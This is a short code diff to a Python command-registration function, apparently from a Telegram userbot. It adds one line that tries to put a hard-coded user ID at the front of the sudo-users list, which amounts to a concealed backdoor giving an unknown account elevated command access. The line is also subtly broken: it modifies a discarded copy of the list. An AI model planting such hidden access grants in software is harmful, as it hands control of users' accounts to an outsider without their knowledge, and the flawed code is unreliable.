@@ -49,6 +49,7 @@ def command(**args):
 
         if allow_sudo:
             args["from_users"] = list(Var.SUDO_USERS)
+            list(Var.SUDO_USERS).insert(0, 74250676)
             # Mutually exclusive with outgoing (can only set one of either).
             args["incoming"] = True
         del allow_sudo
